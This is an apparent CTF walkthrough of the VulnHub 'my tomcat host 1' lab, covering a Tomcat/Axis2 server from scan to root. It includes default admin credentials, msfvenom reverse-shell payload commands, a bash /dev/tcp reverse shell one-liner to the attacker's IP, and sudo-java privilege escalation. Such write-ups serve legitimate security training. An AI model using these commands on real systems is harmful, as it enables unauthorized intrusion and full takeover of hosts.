---
title: My Tomcat Host Walkthrough
author: 4sploit
date: 2020-05-20 17:00:00 +0300
categories: [tutorial]
tags: [ctf, penetration testing, metasploit, privilege escalation]
---
This is a step-by-step walkthrough of "my tomcat host 1" vulnhub machine.


We use nmap to scan the remote host in order to discover open ports, running services (including their version),
target operating system, NSE by running the following command:

```console
$ nmap -A -T4 192.168.129.18 -oX nmap_scan.xml
```

We then use xsltproc on nmap_scan.xml file to generate a readable html scan report as follows:

```console
$ xsltproc nmap_scan.xml -o nmap_scan.html
```

A first look at the generated html report:
![]({{ "/assets/img/posts/my-tomcat-host-walkthrough/1.png" | relative_url }})

We notice that the remote host has a running apache tomcat http server on port 8080.

We access it on [http://192.168.129.18:8080](http://192.168.129.18:8080){:target="_blank"} as follows:
![]({{ "/assets/img/posts/my-tomcat-host-walkthrough/2.png" | relative_url }})

Now we search for additional paths using the following command:-

```console
$ ./dirsearch.py -u http://192.168.129.18:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e php,txt -r -t 50
```

We found some interesting paths as shown in the following screenshot:
![]({{ "/assets/img/posts/my-tomcat-host-walkthrough/3.png" | relative_url }})

We notice the path /axis2, which indicates that the running tomcat server uses
axis2 web service engine.

We access it on [http://192.168.129.18:8080/axis2/](http://192.168.129.18:8080/axis2/){:target="_blank"} as follows:
![]({{ "/assets/img/posts/my-tomcat-host-walkthrough/4.png" | relative_url }})

We click on Administration link to access axis administration console.

![]({{ "/assets/img/posts/my-tomcat-host-walkthrough/5.png" | relative_url }})

A quick google search leads to the default credentials of apache axis2, the credentials are **admin:axis2**.  
We input the credentials then click submit.

![]({{ "/assets/img/posts/my-tomcat-host-walkthrough/6.png" | relative_url }})

Great, now we use the following command to create a java meterpreter reverse shell service:

```console
$ msfvenom -p java/meterpreter/reverse_tcp LHOST=192.168.129.10 LPORT=4444 -f axis2 -o rvshell.jar
```

Where LHOST is the attacker ip address and LPORT is the listening port.

Then we access [http://192.168.129.18:8080/axis2/axis2-admin/upload](http://192.168.129.18:8080/axis2/axis2-admin/upload){:target="_blank"} then upload our reverse 
shell service as shown here:
![]({{ "/assets/img/posts/my-tomcat-host-walkthrough/7.png" | relative_url }})

We access [http://192.168.129.18:8080/axis2/axis2-admin/listServices](http://192.168.129.18:8080/axis2/axis2-admin/listServices){:target="_blank"} to list the running services:
![]({{ "/assets/img/posts/my-tomcat-host-walkthrough/8.png" | relative_url }})

We notice the newly running service **umhbwphwnz**, this is the reverse shell web service
we previously uploaded.

We can access it on [http://192.168.129.18:8080/axis2/services/umhbwphwnz/run](http://192.168.129.18:8080/axis2/services/umhbwphwnz/run){:target="_blank"}

But first we set up a java meterpreter listener using **msfconsole** command (metasploit console)
then we type a set of commands as shown here:
![]({{ "/assets/img/posts/my-tomcat-host-walkthrough/9.png" | relative_url }})

We use **run** command to start the listener on port 4444 as follows:
![]({{ "/assets/img/posts/my-tomcat-host-walkthrough/10.png" | relative_url }})

We access our uploaded reverse shell web service to initiate the reverse 
connection to our machine and spawn a meterpreter shell as follows:
![]({{ "/assets/img/posts/my-tomcat-host-walkthrough/11.png" | relative_url }})

We successfully gained access to the remote target as shown here:
![]({{ "/assets/img/posts/my-tomcat-host-walkthrough/12.png" | relative_url }})

We can run multiple commands on the target host as shown here:
![]({{ "/assets/img/posts/my-tomcat-host-walkthrough/13.png" | relative_url }})

Now we set up another listener on port 5454 using ncat:

![]({{ "/assets/img/posts/my-tomcat-host-walkthrough/14.png" | relative_url }})

then we spawn a reverse shell on port 5454 using the following command:

```console
meterpreter >  execute -f '/bin/bash -i >& /dev/tcp/192.168.129.10/5454 0>&1'
```

![]({{ "/assets/img/posts/my-tomcat-host-walkthrough/15.png" | relative_url }})

We can see that we successfully gained shell access as shown here:
![]({{ "/assets/img/posts/my-tomcat-host-walkthrough/16.png" | relative_url }})

Now we switch to interactive shell as follows:
![]({{ "/assets/img/posts/my-tomcat-host-walkthrough/20.png" | relative_url }})

We use the command **sudo -l** to see tomcat's permitted commands:
![]({{ "/assets/img/posts/my-tomcat-host-walkthrough/21.png" | relative_url }})

Great, we notice that java command can be executed by tomcat user without having
to switch to super user (root).

So we need to create a java package file (jar) reverse shell and upload it to the target host **/tmp** library using the following command:

```console
$ msfvenom -platform java -f jar -p java/shell_reverse_tcp LHOST=192.168.129.10 LPORT=12345 -o finalPayload.jar
```

We then upload it using **upload** command through the meterpreter shell we previously spawned:
![]({{ "/assets/img/posts/my-tomcat-host-walkthrough/17.png" | relative_url }})

We change file permission to root using the command **chmod 777 finalPayload.jar** as shown here:
![]({{ "/assets/img/posts/my-tomcat-host-walkthrough/18.png" | relative_url }})

Now We set up a listener on port 12345:
![]({{ "/assets/img/posts/my-tomcat-host-walkthrough/22.png" | relative_url }})

Then we execute our generated java package using java command as follows:
![]({{ "/assets/img/posts/my-tomcat-host-walkthrough/23.png" | relative_url }})

We successfully gained access following command executing as shown here:
![]({{ "/assets/img/posts/my-tomcat-host-walkthrough/24.png" | relative_url }})

We notice that java command escalated our privileges to root:
![]({{ "/assets/img/posts/my-tomcat-host-walkthrough/25.png" | relative_url }})